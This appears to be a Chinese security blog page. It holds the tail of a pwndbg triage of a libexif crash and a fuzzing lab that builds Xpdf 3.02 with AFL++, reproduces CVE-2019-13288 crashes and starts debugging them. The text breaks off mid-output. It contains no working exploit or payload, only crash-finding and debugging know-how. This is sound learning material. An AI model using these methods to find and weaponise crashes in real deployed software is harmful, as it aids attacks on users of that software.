class="number">0x452c46</span> ◂— <span class="number">0xffffffff2a004d4d</span> <span class="comment">/* &#x27;MM&#x27; */</span></span><br><span class="line">*RDI  <span class="number">0x453120</span> ◂— <span class="number">0x0</span> <span class="comment">/* buf */</span></span><br><span class="line"> RSI  <span class="number">0x0</span> <span class="comment">/* order */</span></span><br><span class="line"> R8   <span class="number">0xffffffff</span></span><br><span class="line"> R9   <span class="number">0x0</span></span><br><span class="line"> R10  <span class="number">0x224ab0</span> (log_func_exit) ◂— push   rbp</span><br><span class="line"> R11  <span class="number">0x7ffff7e4ebe0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x454700</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R12  <span class="number">0x452c46</span> ◂— <span class="number">0xffffffff2a004d4d</span> <span class="comment">/* &#x27;MM&#x27; */</span></span><br><span class="line"> R13  <span class="number">0x453108</span> —▸ <span class="number">0x453120</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R14  <span class="number">0x4530d0</span> —▸ <span class="number">0x453160</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x452c40</span> ◂— <span class="number">0x4d4d000066697845</span> <span class="comment">/* &#x27;Exif&#x27; */</span></span><br><span class="line"> RBP  <span class="number">0xffffffff</span> <span class="comment">/* 异常 */</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffc5d0</span> ◂— <span class="number">0x5b0000006e</span> <span class="comment">/* &#x27;n&#x27; */</span></span><br><span class="line">*RIP  <span class="number">0x22bc13</span> (exif_data_load_data+<span class="number">1315</span>) ◂— mov    edx, dword ptr [rdi]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x22bbca</span> &lt;exif_data_load_data+<span class="number">1242</span>&gt;    cmp    eax, ebx</span><br><span class="line">   <span class="number">0x22bbcc</span> &lt;exif_data_load_data+<span class="number">1244</span>&gt;    jbe    exif_data_load_data+<span class="number">1306</span>                      &lt;exif_data_load_data+<span class="number">1306</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x22bc0a</span> &lt;exif_data_load_data+<span class="number">1306</span>&gt;    mov    ecx, ebp</span><br><span class="line">   <span class="number">0x22bc0c</span> &lt;exif_data_load_data+<span class="number">1308</span>&gt;    add    rcx, r12</span><br><span class="line">   <span class="number">0x22bc0f</span> &lt;exif_data_load_data+<span class="number">1311</span>&gt;    mov    rdi, qword ptr [r13]</span><br><span class="line"> ► <span class="number">0x22bc13</span> &lt;exif_data_load_data+<span class="number">1315</span>&gt;    mov    edx, dword ptr [rdi]</span><br><span class="line">   <span class="number">0x22bc15</span> &lt;exif_data_load_data+<span class="number">1317</span>&gt;    test   edx, edx</span><br><span class="line">   <span class="number">0x22bc17</span> &lt;exif_data_load_data+<span class="number">1319</span>&gt;    je     exif_data_load_data+<span class="number">1384</span>                      &lt;exif_data_load_data+<span class="number">1384</span>&gt; <span class="comment">/* if (!buf) return 0; */</span></span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x22bc58</span> &lt;exif_data_load_data+<span class="number">1384</span>&gt;    mov    rsi, qword ptr [rip + <span class="number">0x1f7a9</span>] &lt;<span class="number">0x24b408</span>&gt;</span><br><span class="line">   <span class="number">0x22bc5f</span> &lt;exif_data_load_data+<span class="number">1391</span>&gt;    mov    al, byte ptr [rsi + <span class="number">0x48b</span>]</span><br><span class="line">   <span class="number">0x22bc65</span> &lt;exif_data_load_data+<span class="number">1397</span>&gt;    add    al, <span class="number">1</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x453120</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi <span class="number">0x453120</span> ◂— <span class="number">0x0</span> <span class="comment">/* buf[0] */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x453128</span> ◂— <span class="number">0x0</span> <span class="comment">/* buf[1] */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x453130</span> —▸ <span class="number">0x452b90</span> ◂— <span class="number">0x8</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x453138</span> —▸ <span class="number">0x452bc0</span> ◂— <span class="number">0x7</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x453140</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x453148</span> ◂— <span class="number">0x400000003</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x453150</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x453158</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>调试后发现一些信息：<ul>
<li><code>exif_get_sshort</code> 的两个参数 <code>buf</code> <code>order</code>（已经标出）</li>
<li><code>RBP</code> 的值异常</li>
</ul>
</li>
<li>后来发现 <code>[rcx]</code> 不合法是由 <code>RBP</code> 异常导致的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*RCX  <span class="number">0xffffffff</span></span><br><span class="line"> RBP  <span class="number">0xffffffff</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x22bc0a</span> &lt;exif_data_load_data+<span class="number">1306</span>&gt;    mov    ecx, ebp <span class="comment">/* ecx == RBP */</span></span><br><span class="line"> ► <span class="number">0x22bc0c</span> &lt;exif_data_load_data+<span class="number">1308</span>&gt;    add    rcx, r12</span><br></pre></td></tr></table></figure>
<p>现在的问题就很明了了：</p>
<ul>
<li>因为 <code>[rcx]</code> 不合法导致了段错误</li>
<li>因为 <code>RBP</code> 异常导致了 <code>[rcx]</code> 不合法</li>
</ul>
<p>现在只要找到导致 <code>RBP</code> 异常的代码就可以了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x22b864</span> &lt;exif_data_load_data+<span class="number">372</span>&gt;    mov    rbp, qword ptr [rcx + <span class="number">0x10</span>]</span><br><span class="line">► <span class="number">0x22b868</span> &lt;exif_data_load_data+<span class="number">376</span>&gt;    test   eax, eax</span><br><span class="line">      </span><br><span class="line">  <span class="number">0x22bb8a</span> &lt;exif_data_load_data+<span class="number">1178</span>&gt;    mov    ebp, dword ptr [r15 + <span class="number">0xa</span>]</span><br><span class="line">► <span class="number">0x22bb8e</span> &lt;exif_data_load_data+<span class="number">1182</span>&gt;    bswap  ebp</span><br></pre></td></tr></table></figure>
<ul>
<li>程序直接控制了 <code>RBP</code>，对应源码如下：（第二处）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line">*RAX  <span class="number">0x4502a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RBX  <span class="number">0x453</span></span><br><span class="line">*RCX  <span class="number">0x453120</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0x1</span></span><br><span class="line">*RDI  <span class="number">0x452c46</span> ◂— <span class="number">0xffffffff2a004d4d</span> <span class="comment">/* &#x27;MM&#x27; */</span></span><br><span class="line">*RSI  <span class="number">0x20c394</span> ◂— <span class="number">0x6873616c46004d4d</span> <span class="comment">/* &#x27;MM&#x27; */</span></span><br><span class="line">*R15  <span class="number">0x452c40</span> ◂— <span class="number">0x4d4d000066697845</span> <span class="comment">/* &#x27;Exif&#x27; */</span></span><br><span class="line">*RBP  <span class="number">0x452b90</span> ◂— <span class="number">0x8</span></span><br><span class="line">*RSP  <span class="number">0x7fffffffc5d0</span> ◂— <span class="number">0x5b0000006e</span> <span class="comment">/* &#x27;n&#x27; */</span></span><br><span class="line">*RIP  <span class="number">0x22bb8a</span> (exif_data_load_data+<span class="number">1178</span>) ◂— mov    ebp, dword ptr [r15 + <span class="number">0xa</span>]</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x22bb8a</span> &lt;exif_data_load_data+<span class="number">1178</span>&gt;    mov    ebp, dword ptr [r15 + <span class="number">0xa</span>]</span><br><span class="line">   <span class="number">0x22bb8e</span> &lt;exif_data_load_data+<span class="number">1182</span>&gt;    bswap  ebp</span><br><span class="line">───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────</span><br><span class="line">In file: /home/yhellow/libexif<span class="number">-0.6</span><span class="number">.14</span>/libexif/exif-utils.c</span><br><span class="line">   <span class="number">130</span> exif_get_slong (<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *b, ExifByteOrder order)</span><br><span class="line">   <span class="number">131</span> &#123;</span><br><span class="line">   <span class="number">132</span> 	<span class="keyword">if</span> (!b) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">133</span>         <span class="keyword">switch</span> (order) &#123;</span><br><span class="line">   <span class="number">134</span>         <span class="keyword">case</span> EXIF_BYTE_ORDER_MOTOROLA:</span><br><span class="line"> ► <span class="number">135</span>                 <span class="keyword">return</span> ((b[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (b[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (b[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | b[<span class="number">3</span>]);</span><br><span class="line">   <span class="number">136</span>         <span class="keyword">case</span> EXIF_BYTE_ORDER_INTEL:</span><br><span class="line">   <span class="number">137</span>                 <span class="keyword">return</span> ((b[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) | (b[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (b[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | b[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">138</span>         &#125;</span><br><span class="line">   <span class="number">139</span> </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x452c40</span>+<span class="number">0xa</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x452c4a</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x452c62</span> ◂— <span class="number">0xffffffffff</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x452c6a</span> ◂— <span class="number">0x2000f010c0008</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x452c72</span> ◂— <span class="number">0x19e000000090000</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x452c7a</span> ◂— <span class="number">0x10000000020010</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x452c82</span> ◂— <span class="number">0x3001201a80000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>应该是程序的逻辑出错了，<code>0x452c40</code> 这里应该是一个结构体</li>
<li>感觉离漏洞点已经很接近了，但就是说不出来具体哪里有问题</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/14/Fuzz%20Lab1-Xpdf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/14/Fuzz%20Lab1-Xpdf/" class="post-title-link" itemprop="url">Fuzz Lab1-Xpdf</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-14 12:06:01" itemprop="dateCreated datePublished" datetime="2022-08-14T12:06:01+08:00">2022-08-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:09:14" itemprop="dateModified" datetime="2022-10-10T00:09:14+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Fuzz-Lab1：Xpdf"><a href="#Fuzz-Lab1：Xpdf" class="headerlink" title="Fuzz-Lab1：Xpdf"></a>Fuzz-Lab1：Xpdf</h2><p>本次实验我们将对 <strong>Xpdf</strong>（一款 PDF 转换解析工具）进行 fuzz，目标是在 <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2019-13288/"><strong>CVE-2019-13288</strong></a> 中发现一个 crash/PoC </p>
<ul>
<li>CVE-2019-13288 是一个漏洞，可能会通过精心制作的 payload 文件导致无限递归</li>
<li>由于程序中每个被调用的函数都会在栈上分配一个栈帧，如果一个函数被递归调用这么多次，就会导致栈内存耗尽和程序崩溃</li>
<li>因此，远程攻击者可以利用它进行 DoS 攻击</li>
</ul>
<p>学习的目标：</p>
<ul>
<li>使用 instrumentation 工具编译目标应用程序</li>
<li>运行模糊器（afl-fuzz）</li>
<li>使用调试器（GDB）对崩溃进行分类</li>
</ul>
<h2 id="Download-and-build-your-target"><a href="#Download-and-build-your-target" class="headerlink" title="Download and build your target"></a>Download and build your target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME # 创建目录</span><br><span class="line">mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/</span><br><span class="line">sudo apt install build-essential</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz # 获取xpdf</span><br><span class="line">tar -xvzf xpdf-3.02.tar.gz</span><br><span class="line"></span><br><span class="line">cd xpdf-3.02 # 编译&amp;安装xpdf</span><br><span class="line">sudo apt update &amp;&amp; sudo apt install -y build-essential gcc</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">cd $HOME/fuzzing_xpdf # 下载一些PDF示例</span><br><span class="line">mkdir pdf_examples &amp;&amp; cd pdf_examples</span><br><span class="line">wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf</span><br><span class="line">wget http://www.africau.edu/images/default/sample.pdf</span><br><span class="line">wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf</span><br></pre></td></tr></table></figure>
<ul>
<li>我们可以使用以下命令测试 pdfinfo 二进制文件：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  pdf_examples $HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/helloworld.pdf</span><br><span class="line">Tagged:         no</span><br><span class="line">Pages:          1</span><br><span class="line">Encrypted:      no</span><br><span class="line">Page size:      200 x 200 pts</span><br><span class="line">MediaBox:           0.00     0.00   200.00   200.00</span><br><span class="line">CropBox:            0.00     0.00   200.00   200.00</span><br><span class="line">BleedBox:           0.00     0.00   200.00   200.00</span><br><span class="line">TrimBox:            0.00     0.00   200.00   200.00</span><br><span class="line">ArtBox:             0.00     0.00   200.00   200.00</span><br><span class="line">File size:      678 bytes</span><br><span class="line">Optimized:      no</span><br><span class="line">PDF version:    1.7</span><br></pre></td></tr></table></figure>
<h2 id="Install-AFL"><a href="#Install-AFL" class="headerlink" title="Install AFL++"></a>Install AFL++</h2><p>在本课程中，我们将使用最新版本的 <a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus">AFL++ fuzzer</a> ，您可以通过两种方式安装所有内容：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update # 安装依赖</span><br><span class="line">sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools</span><br><span class="line">sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang </span><br><span class="line">sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-dev</span><br><span class="line"></span><br><span class="line">cd $HOME # 安装AFL++</span><br><span class="line">git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">make distrib</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>AFL 是一个 <strong>coverage-guided fuzzer</strong>，这意味着它为每个变异的输入收集覆盖信息，以发现新的执行路径和潜在的错误</p>
<ul>
<li>当源代码可用时，AFL 可以使用插桩，在每个基本块（函数、循环等）的开头插入函数调用</li>
<li>要想我们的目标应用程序启用检测，我们需要使用 AFL 的编译器编译代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_xpdf/install # 清理所有之前编译的目标文件和可执行文件</span><br><span class="line">cd $HOME/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot; # 现在我们将使用afl-clang-fast编译器构建xpdf</span><br><span class="line">CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<ul>
<li>在 AFL 编译文件时候 afl-gcc 会在规定位置插入桩代码，可以理解为一个个的探针（但是没有暂停功能），在后续 fuzz 的过程中会根据这些桩代码进行路径探索，测试等</li>
<li>AFL 通过插桩的形式注入到被编译的程序中，实现对分支（branch、edge）覆盖率的捕获，以及分支节点计数</li>
</ul>
<p>我们可以使用以下命令测试 pdfinfo 二进制文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output</span><br></pre></td></tr></table></figure>
<ul>
<li><em>-i</em> ：表示我们必须放置输入案例的目录（a.k.a 文件示例）</li>
</ul>
<ul>
<li><em>-o</em> ：表示 AFL++ 将存储变异文件的目录</li>
<li><em>-s</em> ：表示要使用的静态随机种子</li>
<li><em>@@</em> ：是占位符目标的命令行，AFL 将用每个输入文件名替换</li>
</ul>
<img src="/2022/08/14/Fuzz%20Lab1-Xpdf/1660312674524.png" class width="1660312674524">  
<ul>
<li>红色的 uniq. crash 值，显示发现的唯一崩溃数</li>
<li>您可以在 <code>$HOME/fuzzing_xpdf/out/</code> 目录中找到这些崩溃文件</li>
<li>一旦发现第一次崩溃，您就可以停止模糊器，这是我们将要处理的问题（根据您的机器性能，最多可能需要一到两个小时才能发生崩溃）</li>
</ul>
<h2 id="Do-it-yourself"><a href="#Do-it-yourself" class="headerlink" title="Do it yourself!"></a>Do it yourself!</h2><p>为了完成这个练习，你需要：</p>
<ul>
<li>用指定的文件重现崩溃</li>
<li>调试 crash 发现问题</li>
<li>修复问题</li>
</ul>
<p>PS：预计时间 = 120 分钟</p>
<p>通过上一个部分我们已经获取了两个 crash，在 <code>$HOME/fuzzing_xpdf/out/default/crashes</code> 中可以找到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes ls</span><br><span class="line">id:<span class="number">000000</span>,sig:<span class="number">11</span>,src:<span class="number">000000</span>+<span class="number">000810</span>,time:<span class="number">45712</span>,execs:<span class="number">44457</span>,op:splice,rep:<span class="number">16</span></span><br><span class="line">id:<span class="number">000001</span>,sig:<span class="number">11</span>,src:<span class="number">000726</span>,time:<span class="number">62396</span>,execs:<span class="number">61755</span>,op:havoc,rep:<span class="number">2</span></span><br><span class="line">README.txt</span><br></pre></td></tr></table></figure>
<p>在使用 crash 文件进行调试前，我们需要先了解一下 Xpdf</p>
<h2 id="Xpdf"><a href="#Xpdf" class="headerlink" title="Xpdf"></a>Xpdf</h2><p>Xpdf 是可移植文档格式 (PDF) 文件的开源查看器（这些有时也被称为“Acrobat”文件，来自 Adobe 的 PDF 软件的名称）</p>
<ul>
<li>Xpdf 项目还包括 PDF 文本提取器、PDF 到 PostScript 转换器和各种其他实用程序</li>
<li>Xpdf 在 UNIX、VMS 和 OS/2 上的 X 窗口系统下运行，非 X 组件（pdftops、pdftotext 等）也可以在 Win32 系统上运行，并且应该可以在几乎任何具有像样 C++ 编译器的系统上运行</li>
<li>Xpdf 被设计为小巧高效，它可以使用 Type 1 或 TrueType 字体</li>
</ul>
<p>要运行 Xpdf，只需键入：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xpdf file.pdf</span><br></pre></td></tr></table></figure>
<p>要生成 PostScript 文件，请点击 xpdf 中的“打印”按钮，或运行 pdftops：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftops file.pdf</span><br></pre></td></tr></table></figure>
<p>要生成纯文本文件，请运行 pdftotext：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftotext file.pdf</span><br></pre></td></tr></table></figure>
<p>一共有5个实用程序（在他们的手册页中有完整的描述）：</p>
<ul>
<li>pdftotext — 通过 PDF 文件生成纯文本文件</li>
<li>pdfinfo — 转储 PDF 文件的信息字典（加上其他一些有用的信息）</li>
<li>pdffonts — 列出 PDF 文件中使用的字体以及各种每种字体的信息</li>
<li>pdftops — 将 PDF 文件转换为一系列 PPM/PGM/PBM 格式位图</li>
<li>pdfimages — 从 PDF 文件中提取图像</li>
</ul>
<h2 id="Reproduce-the-crash"><a href="#Reproduce-the-crash" class="headerlink" title="Reproduce the crash"></a>Reproduce the crash</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp id:000000,sig:11,src:000000+000810,time:45712,execs:44457,op:splice,rep:16 /home/yhellow/fuzzing_xpdf/install/bin </span><br><span class="line">cd /home/yhellow/fuzzing_xpdf/install/bin</span><br><span class="line">mv id:000000,sig:11,src:000000+000810,time:45712,execs:44457,op:splice,rep:16 test.pdf</span><br></pre></td></tr></table></figure>
<p>依次使用 <code>pdftotext</code> <code>pdfinfo</code> <code>pdffonts</code> <code>pdftops</code> <code>pdfimages</code> 运行测试文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdftotext test.pdf </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">[1]    3065 segmentation fault  ./pdftotext test.pdf <span class="comment">/* 段错误 */</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdfinfo test.pdf          </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">Subject:        </span></span><br><span class="line"><span class="function">Keywords:       </span></span><br><span class="line"><span class="function">Author:         Administrator</span></span><br><span class="line"><span class="function">Creator:        PDFCreator 2.0.2.0</span></span><br><span class="line"><span class="function">Producer:       Pator 2.0.2.0</span></span><br><span class="line"><span class="function">CreationDate:   Sun Jul 26 00:25:22 2015</span></span><br><span class="line"><span class="function">ModDate:        Sun Jul 26 00:25:22 2015</span></span><br><span class="line"><span class="function">Tagged:         no</span></span><br><span class="line"><span class="function">Pages:          1</span></span><br><span class="line"><span class="function">Encrypted:      no</span></span><br><span class="line"><span class="function">Page size:      595 x 842 <span class="title">pts</span> <span class="params">(A4)</span></span></span><br><span class="line"><span class="function">File size:      4109 bytes</span></span><br><span class="line"><span class="function">Optimized:      no</span></span><br><span class="line"><span class="function">PDF version:    0.0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdffonts test.pdf </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">name                                 type              emb sub uni object ID</span></span><br><span class="line"><span class="function">------------------------------------ ----------------- --- --- --- ---------</span></span><br><span class="line"><span class="function">Times-Roman </span></span><br></pre></td></tr></table></figure>
